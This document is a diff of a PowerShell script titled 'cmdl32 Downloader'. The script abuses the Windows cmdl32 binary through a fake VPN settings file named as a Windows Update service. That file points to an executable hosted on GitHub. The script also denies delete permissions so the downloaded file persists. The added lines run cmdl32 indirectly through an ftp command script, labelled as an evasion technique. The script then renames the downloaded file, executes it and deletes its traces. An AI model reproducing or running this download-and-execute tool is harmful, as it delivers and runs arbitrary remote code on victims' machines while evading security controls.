@@ -1,86 +1,81 @@
-#Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
+Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
 # Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
-
 # Create a temp directory to work in
 $tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
 New-Item -Path $tempDir -ItemType Directory -Force
-
 # Change to the temp directory
 Set-Location -Path $tempDir
-#Write-Host "[*] Working directory changed to $tempDir"
-
-#Write-Host "[*] Denying delete permissions for current user"
+Write-Host "[*] Working directory changed to $tempDir"
+Write-Host "[*] Denying delete permissions for current user"
 # Deny delete permissions in the temp directory for the current user
 icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
-
-#Write-Host "[*] Setting temp environment variable"
+Write-Host "[*] Setting temp environment variable"
 # Set the TMP environment variable to the temp directory
 $env:TMP = $tempDir
-
-#Write-Host "[*] Creating VPN settings file"
+Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
-CMSFile=settings.ini
+CMSFile=settings.txt
 ServiceName=WindowsUpdate
-TunnelFile=settings.ini
+TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\settings.ini" -Value $settingsContent
+Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
+Write-Host "[*] Performing download with cmdl32 using FTP evasion technique"
+# Create FTP command content to execute cmdl32 indirectly
+$ftpCommand = @"
+open localhost
+!cmdl32 /vpn /lan "$tempDir\settings.txt"
+bye
+"@
+Set-Content -Path "$tempDir\ftp_commands.txt" -Value $ftpCommand
 
-#Write-Host "[*] Performing download with cmdl32"
-# Assuming cmdl32 is in system32 or accessible
-$cmdl32Path = "cmdl32"
-$arguments = "-lan -vpn `"$tempDir\settings.ini`""
-
+# Execute the FTP script with embedded cmdl32 command
 try {
-    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
-    #Write-Host "[*] Download complete with cmdl32."
+    Start-Process -FilePath "ftp" -ArgumentList "-s:$tempDir\ftp_commands.txt" -NoNewWindow -Wait
+    Write-Host "[*] Download complete using FTP evasion technique."
 } catch {
-    #Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
+    Write-Host "[!] FTP execution failed: $($_.Exception.Message)"
     # Revert permissions before exiting
     icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
-
-#Write-Host "[*] Reverting permissions"
+Write-Host "[*] Reverting permissions"
 icacls $tempDir /remove:d "$env:USERNAME"
-
-#Write-Host "[*] Renaming downloaded file for execution"
+Write-Host "[*] Renaming downloaded file for execution"
 $downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
-
 if ($downloadedFile) {
-    #Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
+    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
     
     # Construct the target path for the rename
     $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
     
     # Debug output: Check the target path
-    #Write-Host "[*] Target path: $targetPath"
+    Write-Host "[*] Target path: $targetPath"
     
     # Try renaming (or moving) the file using Move-Item
     try {
         Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
-        #Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
+        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
     } catch {
-        #Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
+        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
         Exit
     }
 } else {
-    #Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
+    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
     Exit
 }
-
-#Write-Host "[*] Executing the downloaded file"
+Write-Host "[*] Executing the downloaded file"
 if (Test-Path "$tempDir\whois.exe") {
     Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
-    #Write-Host "[*] Execution complete."
+    Write-Host "[*] Execution complete."
 } else {
-    #Write-Host "[!] whois.exe not found after renaming. Exiting script."
+    Write-Host "[!] whois.exe not found after renaming. Exiting script."
     Exit
 }
-
-#Write-Host "[*] Cleaning up downloaded file"
+Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\settings.ini" -Force
-#Write-Host "[*] Script complete."
+Remove-Item -Path "$tempDir\settings.txt" -Force
+Remove-Item -Path "$tempDir\ftp_commands.txt" -Force
+Write-Host "[*] Script complete."
